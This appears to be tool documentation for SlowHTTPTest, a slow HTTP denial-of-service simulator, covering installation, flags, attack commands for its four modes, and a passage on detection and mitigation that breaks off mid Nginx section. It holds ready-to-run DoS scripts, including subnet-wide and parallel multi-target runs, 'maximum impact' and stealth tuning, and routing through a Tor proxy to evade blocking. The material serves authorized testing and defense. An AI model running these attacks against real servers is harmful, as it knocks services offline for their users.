---
tool_name: "slowhttptest"
display_name: "SlowHTTPTest"
mitre_tactic: "impact"
mitre_tactic_id: "TA0040"
mitre_subcategory: "dos_tools"
install_command: "sudo apt install slowhttptest"
version: "1.9.0"
github_repo: "https://github.com/shekyan/slowhttptest"
kali_tools_page: "https://www.kali.org/tools/slowhttptest/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["dos", "layer-7", "slowloris", "slow-read", "slow-post", "apache-killer", "http"]
related_tools: ["goldeneye", "hping3", "siege", "thc-ssl-dos"]
---

# SlowHTTPTest — Application Layer DoS Simulator

## Chapter 1: Introduction and Overview

### What is SlowHTTPTest?

SlowHTTPTest is a highly configurable application layer (Layer 7) denial-of-service attack simulation tool. It implements the most common low-bandwidth application layer DoS attacks that can render web servers unresponsive by exhausting their connection pools and worker threads without requiring massive bandwidth. The tool was developed by Sergey Shekyan and is written in C++, making it performant and capable of managing thousands of concurrent connections from a single machine.

Unlike volumetric flooding attacks that saturate network links, SlowHTTPTest operates at extremely low bandwidth by opening many connections and sending data so slowly that the server's connection pool fills up, leaving no resources for legitimate users. This makes the attacks particularly difficult to detect with traditional bandwidth-monitoring tools.

### History and Background

- **Author:** Sergey Shekyan (shekyan@gmail.com)
- **Language:** C++
- **License:** Apache License 2.0
- **Repository:** https://github.com/shekyan/slowhttptest
- **First release:** 2011
- **Latest version:** 1.9.0
- **Dependencies:** OpenSSL (libssl3t64 on modern Debian/Kali)

SlowHTTPTest was created to reproduce and test against several well-known slow-rate DoS attack vectors that were discovered between 2009 and 2011. The original Slowloris attack was presented by Robert Hansen (RSnake) at OWASP AppSec EU 2009. SlowHTTPTest consolidates multiple attack variants into a single tool for penetration testers and security researchers.

### Supported Attack Modes

| Mode | Flag | Name | Description |
|------|------|------|-------------|
| Slow Headers | `-H` | Slowloris (default) | Opens connections and sends incomplete HTTP headers, periodically sending small follow-up data to keep connections alive but never completing the request. Exhausts server connection pools. |
| Slow Body | `-B` | R-U-Dead-Yet | Sends a complete HTTP header with a large Content-Length but transmits the body at an extremely slow rate, tying up server resources that wait for the full body. |
| Range Header | `-R` | Apache Killer | Sends requests with many overlapping Range headers causing the server to create massive amounts of in-memory byte-range data, leading to memory and CPU exhaustion. |
| Slow Read | `-X` | Slow Read | Opens valid connections and sends legitimate requests but reads the responses at an extremely slow rate (tiny receive windows), tying up server output buffers. |

### How Slow HTTP Attacks Work

Traditional DoS attacks flood a target with more traffic than it can handle. Slow HTTP attacks take a fundamentally different approach:

1. **Connection exhaustion:** A web server has a finite number of worker threads or connections (e.g., Apache prefork might default to 150-256 workers). Each slow connection consumes one worker.
2. **Incomplete requests:** The server waits for a complete request before freeing the worker. By never completing the request, the attacker holds the worker indefinitely.
3. **Low bandwidth:** These attacks use very little bandwidth (sometimes under 1 Kbps per connection), making them hard to distinguish from legitimate slow clients.
4. **Protocol compliance:** Each partial request technically conforms to HTTP protocol rules, making them harder for WAFs to block.

### When to Use This Tool

- **Authorized penetration testing** against web servers to assess resilience
- **Security hardening validation** — verifying that mitigations (mod_reqtimeout, HAProxy, Nginx limits) work
- **Red team engagements** simulating advanced denial-of-service scenarios
- **CTF competitions** where web service disruption is part of the challenge
- **Security research** studying application layer DoS resilience
- **Load testing** (with care) to understand server behavior under extreme conditions

### When NOT to Use This Tool

- Against any target without explicit written authorization
- Against production systems without coordination and safeguards
- Against government, critical infrastructure, or any system where downtime could cause harm
- In any jurisdiction where DoS simulation tools are prohibited
- Against third-party services or websites you do not own or have permission to test

### Legal and Ethical Considerations

- **Written authorization is mandatory** before using this tool against any target
- **Define scope and rules of engagement** including maximum duration and connection counts
- **Have a stop condition** — agree on signals to abort testing if production impact exceeds acceptable thresholds
- **Document all activity** for compliance and audit purposes
- **Never use against targets outside your authorized scope**
- Unauthorized DoS attacks violate the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent laws worldwide

### MITRE ATT&CK Mapping

- **Tactic:** Impact (TA0040)
- **Technique:** T1499 — Endpoint Denial of Service
  - T1499.001 — OS Exhaustion Flood
  - T1499.002 — Service Exhaustion Flood
  - T1499.003 — Application Exhaustion Flood

---

## Chapter 2: Installation and Setup

### System Requirements

- **Operating System:** Linux (Kali, Debian, Ubuntu, CentOS, Arch), macOS, FreeBSD
- **Architecture:** x86_64, i386, arm64
- **RAM:** 64 MB minimum (more connections = more memory)
- **Disk Space:** 1 MB for the binary
- **Network:** Access to the target web server
- **Privileges:** Non-root for most operations; root may be needed for very high connection counts or raw socket operations
- **Dependencies:** OpenSSL (libssl3t64), libstdc++6, libc6

### Installation Methods

#### Method 1: Kali Linux / Debian / Ubuntu (Recommended)

```bash
sudo apt update
sudo apt install slowhttptest
```

This installs version 1.9.0 with all dependencies resolved automatically.

#### Method 2: Compile from Source

```bash
# Install build dependencies
sudo apt install build-essential git libssl-dev

# Clone the repository
git clone https://github.com/shekyan/slowhttptest.git
cd slowhttptest

# Build
./configure
make

# Install system-wide
sudo make install

# Verify
slowhttptest -h
```

#### Method 3: Docker

```bash
docker run --rm shekyan/slowhttptest slowhttptest -h
```

#### Method 4: macOS (Homebrew)

```bash
brew install slowhttptest
```

#### Method 5: Arch Linux

```bash
yay -S slowhttptest
# or from AUR
```

### Dependencies

```bash
# Debian/Ubuntu
sudo apt install libssl-dev libstdc++6 libc6

# RHEL/CentOS
sudo yum install openssl-devel libstdc++ gcc-c++

# Arch
sudo pacman -S openssl gcc-libs
```

### Configuration

SlowHTTPTest does not use a configuration file. All parameters are passed via command-line flags. You can wrap commands in scripts for repeatable testing configurations.

### Verification

```bash
slowhttptest -h
# Output shows version, usage, and all available flags

slowhttptest --version
# Shows version string
```

### File Locations

```
/usr/bin/slowhttptest          # Binary
/usr/share/man/man1/slowhttptest.1.gz   # Man page
/usr/share/doc/slowhttptest/   # Documentation
```

---

## Chapter 3: Basic Usage

### Syntax

```
slowhttptest [options ...]
```

### First Test Run

```bash
# Slowloris attack against a local test server
slowhttptest -c 1000 -H -g -o stats -u http://192.168.1.100/index.html -x 24 -p 3 -r 200 -i 10
```

**Sample Output:**
```
Welcome to SlowHTTPTest v1.9.0 -- a tool to test your web server for slow HTTP DoS vulnerabilities

---------------------------------------------
  test parameters:
  target:                  http://192.168.1.100/index.html
  connection rate:         200 connections/sec
  connections limit:       1000
  test length:             240 seconds
  verb:                    GET
  follow-up interval:      10 seconds
  probe timeout:           3 seconds
  test mode:               Slow Headers (Slowloris)

starting test...
  00:00:00 - connecting... connected
  00:00:01 - sending headers to 200 open connections
  00:00:02 - sending headers to 400 open connections
  00:00:03 - sending headers to 600 open connections
  00:00:04 - sending headers to 800 open connections
  00:00:05 - sending headers to 1000 open connections
  00:00:06 - all connections are established, sending followup data
  00:00:16 - sending followup data to 1000 open connections
  00:00:26 - sending followup data to 1000 open connections
  ...
  00:04:00 - test complete, generating reports...
  statistics:
    open connections:   987
    failed connections: 13
    closed connections: 0
    server seems to be vulnerable
```

### Complete Flag Reference

#### Test Mode Selection

| Flag | Description | Default |
|------|-------------|---------|
| `-H` | Slow Headers mode (Slowloris) | This is the default mode |
| `-B` | Slow Body mode (R-U-Dead-Yet) | — |
| `-R` | Range Header mode (Apache Killer) | — |
| `-X` | Slow Read mode (Slow Read) | — |

#### General Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u URL` | Absolute URL of target (e.g., http://host/path) | Required |
| `-c connections` | Target number of concurrent connections | 50 |
| `-l seconds` | Total test duration in seconds | 240 |
| `-r rate` | Connection creation rate (connections per second) | 50 |
| `-i seconds` | Interval between follow-up data sends (Slow Headers / Slow Body) | 10 |
| `-t verb` | HTTP verb to use in requests (GET for headers/read, POST for body) | GET |
| `-s bytes` | Value of Content-Length header (Slow Body mode) | 4096 |
| `-x bytes` | Max length of randomized follow-up data per tick | 32 |
| `-f content-type` | Value of Content-Type header | application/x-www-form-urlencoded |
| `-m accept` | Value of Accept header | text/html;q=0.9,... |

#### Reporting Options

| Flag | Description | Default |
|------|-------------|---------|
| `-g` | Generate CSV and HTML statistics files (adds timestamp to filename) | off |
| `-o file_prefix` | Custom output file prefix (requires `-g`) | auto-generated |
| `-v level` | Verbosity level: 0=Fatal, 1=Info, 2=Error, 3=Warning, 4=Debug | 1 |

#### Probe / Proxy Options

| Flag | Description | Default |
|------|-------------|---------|
| `-d host:port` | Direct all traffic through HTTP proxy | off |
| `-e host:port` | Direct only probe traffic through HTTP proxy | off |
| `-p seconds` | Timeout for probe connection (server considered DoSed after this) | 5 |
| `-j cookies` | Value of Cookie header | — |

#### Range Attack Specific Options

| Flag | Description | Default |
|------|-------------|---------|
| `-a start` | Left boundary of range in Range header | 5 |
| `-b bytes` | Limit for range header right boundary values | 2000 |

#### Slow Read Specific Options

| Flag | Description | Default |
|------|-------------|---------|
| `-k num` | Number of times to repeat request per connection (pipeline factor) | 1 |
| `-n seconds` | Interval between read operations from recv buffer | 1 |
| `-w bytes` | Start of advertised TCP window size range | 1 |
| `-y bytes` | End of advertised TCP window size range | 512 |
| `-z bytes` | Bytes to read from recv buffer per read() call | 5 |

### Basic Examples by Mode

#### Slow Headers (Slowloris)

```bash
slowhttptest -H -u http://target.com/ -c 1000 -r 200 -i 10 -l 240 -g -o slowloris_stats -x 24 -p 3
```

Opens 1000 connections at 200/sec, sends partial headers every 10 seconds, and runs for 240 seconds.

#### Slow Body (R-U-Dead-Yet)

```bash
slowhttptest -B -u http://target.com/login -c 3000 -r 200 -i 110 -s 8192 -x 10 -p 3 -g -o slowbody_stats
```

Sends POST requests with Content-Length of 8192 but transmits the body at a very slow rate.

#### Apache Range Header

```bash
slowhttptest -R -u http://target.com/ -t HEAD -c 1000 -a 10 -b 3000 -r 500
```

Generates Range headers like `Range: 0-, 10-1, 10-2, ... 10-3000` to trigger Apache's memory-intensive range processing.

#### Slow Read

```bash
slowhttptest -X -u http://target.com/ -c 8000 -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -p 3
```

Opens valid connections and reads responses at 32 bytes per 5 seconds with a tiny advertised TCP window.

---

## Chapter 4: Intermediate Usage

### Bash Scripting and Automation

#### Automated Vulnerability Check Script

```bash
#!/bin/bash
# slow_test_all_modes.sh - Test a web server against all SlowHTTPTest modes

TARGET_URL="$1"
OUTPUT_DIR="${2:-slow_test_results}"
DURATION="${3:-120}"
CONNECTIONS="${4:-500}"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url> [output_dir] [duration_secs] [connections]"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "=== SlowHTTPTest Full Assessment ==="
echo "Target: $TARGET_URL"
echo "Duration: ${DURATION}s per mode"
echo "Connections: $CONNECTIONS"
echo "Output: $OUTPUT_DIR"
echo ""

# Test 1: Slow Headers (Slowloris)
echo "[1/4] Testing Slow Headers (Slowloris)..."
slowhttptest -H -u "$TARGET_URL" -c "$CONNECTIONS" -r 100 -i 10 \
    -l "$DURATION" -x 24 -p 3 -g \
    -o "$OUTPUT_DIR/${TIMESTAMP}_slow_headers" \
    -v 1 2>&1 | tee "$OUTPUT_DIR/${TIMESTAMP}_slow_headers.log"

# Wait between tests
echo ""
echo "Cooling down for 30 seconds..."
sleep 30

# Test 2: Slow Body
echo "[2/4] Testing Slow Body (R-U-Dead-Yet)..."
slowhttptest -B -u "$TARGET_URL" -c "$CONNECTIONS" -r 100 -i 110 \
    -s 8192 -x 10 -l "$DURATION" -p 3 -g \
    -o "$OUTPUT_DIR/${TIMESTAMP}_slow_body" \
    -v 1 2>&1 | tee "$OUTPUT_DIR/${TIMESTAMP}_slow_body.log"

echo ""
echo "Cooling down for 30 seconds..."
sleep 30

# Test 3: Range Header
echo "[3/4] Testing Range Header (Apache Killer)..."
slowhttptest -R -u "$TARGET_URL" -t HEAD -c "$CONNECTIONS" -a 10 -b 3000 \
    -r 200 -l "$DURATION" -p 3 -g \
    -o "$OUTPUT_DIR/${TIMESTAMP}_range_header" \
    -v 1 2>&1 | tee "$OUTPUT_DIR/${TIMESTAMP}_range_header.log"

echo ""
echo "Cooling down for 30 seconds..."
sleep 30

# Test 4: Slow Read
echo "[4/4] Testing Slow Read..."
slowhttptest -X -u "$TARGET_URL" -c "$CONNECTIONS" -r 200 -w 512 -y 1024 \
    -n 5 -z 32 -k 3 -l "$DURATION" -p 3 -g \
    -o "$OUTPUT_DIR/${TIMESTAMP}_slow_read" \
    -v 1 2>&1 | tee "$OUTPUT_DIR/${TIMESTAMP}_slow_read.log"

echo ""
echo "=== Assessment Complete ==="
echo "Results saved in: $OUTPUT_DIR"
echo ""
echo "Generated files:"
ls -la "$OUTPUT_DIR"/${TIMESTAMP}_*
```

#### Python Wrapper for SlowHTTPTest

```python
#!/usr/bin/env python3
"""
slowhttptest_wrapper.py - Python wrapper for automated SlowHTTPTest execution.
Provides structured output and reporting capabilities.
"""
import subprocess
import json
import csv
import os
import sys
import re
from datetime import datetime
from pathlib import Path


class SlowHTTPTestRunner:
    """Wrapper class for slowhttptest command-line tool."""

    VALID_MODES = {
        "slowloris": "-H",
        "slow_body": "-B",
        "range_header": "-R",
        "slow_read": "-X",
    }

    def __init__(self, binary_path="slowhttptest"):
        self.binary = binary_path

    def run_attack(
        self,
        target_url,
        mode="slowloris",
        connections=500,
        rate=100,
        duration=120,
        followup_interval=10,
        output_dir="slowhttptest_results",
        verbose=1,
        **kwargs,
    ):
        """
        Execute a slowhttptest attack.

        Args:
            target_url: Target URL (e.g., http://target.com/)
            mode: Attack mode (slowloris, slow_body, range_header, slow_read)
            connections: Number of connections to open
            rate: Connection creation rate per second
            duration: Test duration in seconds
            followup_interval: Seconds between follow-up data sends
            output_dir: Directory for output files
            verbose: Verbosity level (0-4)
            **kwargs: Additional mode-specific options

        Returns:
            dict: Parsed results including open/failed/closed connections
        """
        if mode not in self.VALID_MODES:
            raise ValueError(f"Invalid mode '{mode}'. Choose from: {list(self.VALID_MODES.keys())}")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(output_dir, exist_ok=True)
        output_prefix = os.path.join(output_dir, f"{mode}_{timestamp}")

        cmd = [
            self.binary,
            self.VALID_MODES[mode],
            "-u", target_url,
            "-c", str(connections),
            "-r", str(rate),
            "-l", str(duration),
            "-i", str(followup_interval),
            "-g",
            "-o", output_prefix,
            "-v", str(verbose),
        ]

        # Mode-specific options
        if mode == "slow_body":
            cmd.extend(["-s", str(kwargs.get("content_length", 8192))])
            cmd.extend(["-x", str(kwargs.get("followup_data_length", 10))])
        elif mode == "range_header":
            cmd.extend(["-t", kwargs.get("verb", "HEAD")])
            cmd.extend(["-a", str(kwargs.get("range_start", 10))])
            cmd.extend(["-b", str(kwargs.get("range_limit", 3000))])
        elif mode == "slow_read":
            cmd.extend(["-w", str(kwargs.get("window_start", 512))])
            cmd.extend(["-y", str(kwargs.get("window_end", 1024))])
            cmd.extend(["-n", str(kwargs.get("read_interval", 5))])
            cmd.extend(["-z", str(kwargs.get("read_bytes", 32))])
            cmd.extend(["-k", str(kwargs.get("pipeline_factor", 3))])
        elif mode == "slowloris":
            cmd.extend(["-x", str(kwargs.get("followup_data_length", 24))])

        if "cookies" in kwargs:
            cmd.extend(["-j", kwargs["cookies"]])
        if "proxy" in kwargs:
            cmd.extend(["-d", kwargs["proxy"]])
        if "probe_proxy" in kwargs:
            cmd.extend(["-e", kwargs["probe_proxy"]])
        if "probe_timeout" in kwargs:
            cmd.extend(["-p", str(kwargs["probe_timeout"])])

        print(f"[*] Executing: {' '.join(cmd)}")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=duration + 60,
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = f"[!] Process timed out after {duration + 60} seconds"
        except FileNotFoundError:
            return {"error": f"Binary not found: {self.binary}"}

        parsed = self._parse_output(output, output_prefix)
        parsed["mode"] = mode
        parsed["target"] = target_url
        parsed["connections"] = connections
        parsed["duration"] = duration
        parsed["timestamp"] = timestamp

        report_path = os.path.join(output_dir, f"{mode}_{timestamp}_report.json")
        with open(report_path, "w") as f:
            json.dump(parsed, f, indent=2)
        print(f"[+] Report saved to {report_path}")

        return parsed

    def _parse_output(self, output, output_prefix):
        """Parse slowhttptest output to extract statistics."""
        stats = {
            "raw_output": output,
            "open_connections": 0,
            "failed_connections": 0,
            "closed_connections": 0,
            "vulnerable": False,
            "html_report": f"{output_prefix}.html",
            "csv_report": f"{output_prefix}.csv",
        }

        # Extract final statistics from output
        open_match = re.search(r"open connections:\s+(\d+)", output)
        failed_match = re.search(r"failed connections:\s+(\d+)", output)
        closed_match = re.search(r"closed connections:\s+(\d+)", output)

        if open_match:
            stats["open_connections"] = int(open_match.group(1))
        if failed_match:
            stats["failed_connections"] = int(failed_match.group(1))
        if closed_match:
            stats["closed_connections"] = int(closed_match.group(1))

        if "server seems to be vulnerable" in output.lower():
            stats["vulnerable"] = True

        # Parse CSV if it exists
        csv_path = f"{output_prefix}.csv"
        if os.path.exists(csv_path):
            try:
                with open(csv_path, "r") as f:
                    reader = csv.DictReader(f)
                    stats["csv_data"] = list(reader)
            except Exception:
                pass

        return stats

    def compare_modes(self, target_url, connections=500, duration=60, output_dir="comparison"):
        """Run all four attack modes and compare results."""
        results = {}
        for mode in self.VALID_MODES:
            print(f"\n{'='*60}")
            print(f"Testing mode: {mode}")
            print(f"{'='*60}")
            results[mode] = self.run_attack(
                target_url,
                mode=mode,
                connections=connections,
                duration=duration,
                output_dir=output_dir,
            )
        return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 slowhttptest_wrapper.py <target_url> [mode] [connections] [duration]")
        print(f"Modes: {', '.join(SlowHTTPTestRunner.VALID_MODES.keys())}")
        sys.exit(1)

    target = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "slowloris"
    conns = int(sys.argv[3]) if len(sys.argv) > 3 else 500
    dur = int(sys.argv[4]) if len(sys.argv) > 4 else 120

    runner = SlowHTTPTestRunner()
    result = runner.run_attack(target, mode=mode, connections=conns, duration=dur)

    print(f"\n{'='*60}")
    print("RESULTS SUMMARY")
    print(f"{'='*60}")
    print(f"  Mode:              {result['mode']}")
    print(f"  Open connections:  {result['open_connections']}")
    print(f"  Failed connections:{result['failed_connections']}")
    print(f"  Closed connections:{result['closed_connections']}")
    print(f"  Vulnerable:        {'YES' if result['vulnerable'] else 'NO'}")
```

### Tool Chaining

#### Nmap Discovery + SlowHTTPTest

```bash
#!/bin/bash
# chain_nmap_slowhttptest.sh - Find web servers and test them

TARGET_SUBNET="$1"
OUTPUT_DIR="chained_results_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

# Phase 1: Discover web servers with Nmap
echo "[*] Phase 1: Discovering web servers in $TARGET_SUBNET..."
nmap -p 80,443,8080,8443 --open -oG "$OUTPUT_DIR/nmap_results.grep" "$TARGET_SUBNET"

# Extract HTTP hosts
grep "80/open\|443/open\|8080/open\|8443/open" "$OUTPUT_DIR/nmap_results.grep" \
    | awk '{print $2}' | sort -u > "$OUTPUT_DIR/web_targets.txt"

echo "[+] Found $(wc -l < "$OUTPUT_DIR/web_targets.txt") web server(s)"

# Phase 2: Test each server
echo ""
echo "[*] Phase 2: Running SlowHTTPTest against each target..."
while IFS= read -r host; do
    echo ""
    echo "[*] Testing: $host"

    # Quick slowloris test
    slowhttptest -H -u "http://$host/" \
        -c 500 -r 100 -i 10 -l 60 \
        -x 24 -p 3 -g \
        -o "$OUTPUT_DIR/$(echo $host | tr '.' '_')_slowloris" \
        -v 1

done < "$OUTPUT_DIR/web_targets.txt"

echo ""
echo "[+] Chained scan complete. Results in $OUTPUT_DIR/"
```

#### WAF Bypass with Proxy Chain

```bash
# Route slowhttptest through a proxy chain to avoid IP-based blocking
slowhttptest -H -u http://target.com/ \
    -c 1000 -r 200 -i 10 -l 240 \
    -d 127.0.0.1:9050 \
    -x 24 -p 3 -g -o proxy_test

# Note: -d routes ALL traffic through the proxy
# Use -e to route only probe traffic through the proxy
```

---

## Chapter 5: Advanced Usage

### Custom Configurations

#### Tuning for Maximum Impact (Slowloris)

```bash
# Aggressive Slowloris: 5000 connections, fast creation, short follow-up
slowhttptest -H -u http://target.com/ \
    -c 5000 -r 500 -i 5 -l 300 \
    -x 32 -p 10 \
    -g -o aggressive_slowloris -v 4
```

#### Tuning for Stealth (Slow Read)

```bash
# Stealthy Slow Read: low connection count, tiny reads, long intervals
slowhttptest -X -u http://target.com/ \
    -c 200 -r 20 -n 15 -z 3 -w 128 -y 256 \
    -k 1 -l 600 -p 3 \
    -g -o stealthy_slow_read -v 2
```

#### Range Header Exploit (Apache Killer)

```bash
# Maximum overlap range headers
slowhttptest -R -u http://target.com/ \
    -t HEAD -c 2000 -a 10 -b 10000 \
    -r 500 -l 120 -p 3 \
    -g -o apache_killer_test -v 3
```

### Advanced Automation

#### Continuous Monitoring Script

```bash
#!/bin/bash
# continuous_monitor.sh - Run slowhttptest in intervals and monitor results

TARGET="$1"
INTERVAL=600  # 10 minutes between tests
TEST_DURATION=120
CONNECTIONS=1000

while true; do
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    echo "[$(date)] Starting test cycle..."

    # Run slowloris test
    slowhttptest -H -u "$TARGET" \
        -c "$CONNECTIONS" -r 200 -i 10 \
        -l "$TEST_DURATION" -x 24 -p 3 \
        -g -o "/var/log/slowhttptest/cycle_${TIMESTAMP}" \
        -v 2 2>&1 | tail -20

    # Check if server responded with errors (indicating vulnerability)
    HTML_FILE="/var/log/slowhttptest/cycle_${TIMESTAMP}.html"
    if [ -f "$HTML_FILE" ]; then
        OPEN=$(grep -oP 'open connections: \K\d+' "$HTML_FILE" 2>/dev/null || echo "0")
        echo "[$(date)] Open connections at end: $OPEN / $CONNECTIONS"
    fi

    echo "[$(date)] Sleeping for $INTERVAL seconds..."
    sleep "$INTERVAL"
done
```

#### Multi-Target Parallel Testing

```bash
#!/bin/bash
# parallel_slow_test.sh - Test multiple targets simultaneously

TARGETS_FILE="$1"
CONNECTIONS="${2:-500}"
DURATION="${3:-120}"
MAX_PARALLEL="${4:-5}"
OUTPUT_DIR="parallel_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "[*] Reading targets from $TARGETS_FILE"
echo "[*] Max parallel tests: $MAX_PARALLEL"
echo "[*] Output directory: $OUTPUT_DIR"

test_target() {
    local target="$1"
    local outfile="$2"
    echo "[*] Testing $target..."
    slowhttptest -H -u "$target" \
        -c "$CONNECTIONS" -r 100 -i 10 \
        -l "$DURATION" -x 24 -p 3 \
        -g -o "$outfile" \
        -v 1 2>&1 | tail -5
    echo "[+] Done: $target"
}

export -f test_target

# Read targets and run in parallel
COUNTER=0
while IFS= read -r target; do
    [ -z "$target" ] && continue
    COUNTER=$((COUNTER + 1))
    BASENAME=$(echo "$target" | sed 's|https\?://||;s|/|_|g;s|:|_|g')
    test_target "$target" "$OUTPUT_DIR/result_${COUNTER}_${BASENAME}" &

    # Limit parallelism
    if (( COUNTER % MAX_PARALLEL == 0 )); then
        echo "[*] Waiting for batch to complete..."
        wait
    fi
done < "$TARGETS_FILE"

wait
echo "[+] All parallel tests complete."
echo "[*] Results in $OUTPUT_DIR/"
ls -la "$OUTPUT_DIR"/*.html 2>/dev/null
```

### Performance Tuning

```bash
# Increase file descriptor limit for high connection counts
ulimit -n 65535

# Increase TCP buffer sizes
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535
sudo sysctl -w net.core.netdev_max_backlog=65535

# Reduce TIME_WAIT timeout to free ports faster
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
sudo sysctl -w net.ipv4.tcp_fin_timeout=15

# Expand ephemeral port range
sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Penetration Test — Apache Web Server Assessment

**Objective:** Assess whether a client's Apache web server is resilient against slow HTTP attacks during a penetration test engagement.

**Authorization:** Written engagement letter obtained, scope defined as testing web server resilience from the internal network.

**Step-by-step:**

```bash
# 1. Reconnaissance: Confirm Apache
nmap -sV -p 80 target.corp.local
# Server: Apache/2.4.52 (Ubuntu)

# 2. Quick vulnerability probe with Slowloris
slowhttptest -H -u http://target.corp.local/ \
    -c 500 -r 100 -i 10 -l 60 \
    -x 24 -p 3 -g -o /tmp/apache_probe -v 2

# Check results
cat /tmp/apache_probe.csv
# If open_connections is high relative to total, server is vulnerable

# 3. Full assessment with all modes
for mode_flag in "-H" "-B" "-X"; do
    MODE_NAME=$(case $mode_flag in
        -H) echo "slow_headers";;
        -B) echo "slow_body";;
        -X) echo "slow_read";;
    esac)
    
    echo "[*] Testing $MODE_NAME..."
    slowhttptest $mode_flag -u http://target.corp.local/ \
        -c 1000 -r 200 -i 10 -l 120 \
        -x 24 -p 3 -g \
        -o "/tmp/apache_full_${MODE_NAME}" -v 1
    
    sleep 30  # Cooldown between tests
done

# 4. Analyze and include in report
echo "=== Penetration Test Finding: Application Layer DoS ==="
echo "The Apache 2.4.52 server was found to be vulnerable to Slowloris attacks."
echo "With 500 connections, the server's worker pool was exhausted within 60 seconds."
echo ""
echo "Recommendation: Deploy mod_reqtimeout or place a reverse proxy (Nginx/HAProxy) in front."
```

### Scenario 2: Red Team Exercise — Cloud Web Application

**Objective:** Simulate a denial-of-service condition against a cloud-hosted web application as part of a red team exercise to test the blue team's detection and response capabilities.

**Step-by-step:**

```bash
# 1. Verify scope and rules of engagement
# Target: app.redteam-lab.com (in scope per engagement document)
# Max connections: 2000
# Max duration: 5 minutes per test
# Signal to abort: email to redteam-lead@company.com

# 2. Test from a non-obvious source
# Use a VPS in a different region to avoid geo-blocking

# 3. Slowloris test with moderate intensity
slowhttptest -H -u https://app.redteam-lab.com/ \
    -c 2000 -r 200 -i 10 -l 300 \
    -x 24 -p 3 -g \
    -o /tmp/redteam_slowloris \
    -v 2 2>&1 | tee /tmp/redteam_log.txt

# 4. Monitor from another terminal
# Check if the application becomes unresponsive
while true; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://app.redteam-lab.com/)
    echo "$(date) - HTTP $STATUS"
    sleep 5
done

# 5. Document blue team response time
# Record: when alert fires, when blocking occurs, when service recovers

# 6. If blocked, switch to Slow Read (harder to detect)
sleep 60  # Wait for IP ban to expire or change source
slowhttptest -X -u https://app.redteam-lab.com/ \
    -c 500 -r 100 -n 10 -w 256 -y 512 -z 16 \
    -k 2 -l 300 -p 3 -g \
    -o /tmp/redteam_slowread \
    -v 2
```

### Scenario 3: Security Hardening Validation — Nginx Behind HAProxy

**Objective:** Validate that a newly deployed Nginx + HAProxy architecture properly mitigates slow HTTP attacks.

**Step-by-step:**

```bash
# 1. Baseline: test without mitigations (before deployment)
slowhttptest -H -u http://target.com/ \
    -c 1000 -r 200 -i 10 -l 120 \
    -x 24 -p 3 -g -o /tmp/before_mitigation -v 2

# 2. After deploying HAProxy + Nginx, re-test
slowhttptest -H -u http://target.com/ \
    -c 1000 -r 200 -i 10 -l 120 \
    -x 24 -p 3 -g -o /tmp/after_haproxy -v 2

# 3. Compare results
echo "=== Before Mitigation ==="
grep "open connections" /tmp/before_mitigation.html

echo "=== After HAProxy + Nginx ==="
grep "open connections" /tmp/after_haproxy.html

# 4. Test Slow Read (often bypasses basic protections)
slowhttptest -X -u http://target.com/ \
    -c 2000 -r 300 -n 5 -w 128 -y 256 -z 8 \
    -k 1 -l 120 -p 3 -g -o /tmp/after_slowread -v 2

# 5. Verify Nginx worker connections aren't exhausted
ssh nginx-server "curl -s http://127.0.0.1/nginx_status"

# 6. Check HAProxy stats
ssh haproxy-server "echo 'show stat' | socat unix:/var/run/haproxy/admin.sock stdio"
```

---

## Chapter 7: Detection and Defense

### How Defenders Detect SlowHTTPTest

#### Network Signature Detection

```bash
# Suricata/Snort rule: detect slowloris-style incomplete requests
# Alert on connections that remain in ESTABLISHED state with minimal data transfer
alert tcp any any -> $HOME_NET 80 (
    msg:"Potential Slowloris Attack - Incomplete HTTP Request";
    flow:to_server,established;
    content:"GET "; depth:4;
    http.header;
    threshold:type both, track by_src, count 200, seconds 60;
    sid:2000001; rev:1;
)
```

#### Log Analysis

```bash
# Apache: Look for many connections from same IP with incomplete requests
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
# If one IP has hundreds of connections, investigate

# Nginx: Check for slow request rates
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head

# Monitor Apache server-status for worker exhaustion
curl -s http://localhost/server-status?auto | jq '.BusyWorkers, .IdleWorkers'
# If IdleWorkers is near 0, the server is under attack
```

#### Connection Monitoring

```bash
#!/bin/bash
# monitor_connections.sh - Watch for slow HTTP attack patterns

while true; do
    echo "=== $(date) ==="
    echo "--- Connection States ---"
    ss -s
    echo ""
    echo "--- Connections to port 80/443 by state ---"
    ss -ant '( sport = :80 or sport = :443 )' | \
        awk 'NR>1 {print $1}' | sort | uniq -c | sort -rn
    echo ""
    echo "--- Top 10 source IPs ---"
    ss -ant '( sport = :80 or sport = :443 )' | \
        awk 'NR>1 {split($5,a,":"); print a[1]}' | sort | uniq -c | sort -rn | head
    echo ""
    sleep 10
done
```

### Mitigation Strategies

#### Apache: mod_reqtimeout

```apache
# /etc/apache2/conf-enabled/reqtimeout.conf
<IfModule mod_reqtimeout.c>
    # Close connections that don't send complete headers within 20 seconds
    RequestReadTimeout header=20-40,MinRate=500
    # Close connections that don't send complete body within 20 seconds
    RequestReadTimeout body=20,MinRate=500
</IfModule>
```

```bash
# Enable the module
sudo a2enmod reqtimeout
sudo systemctl restart apache2
```

#### Nginx: Timeouts and Limits

```nginx
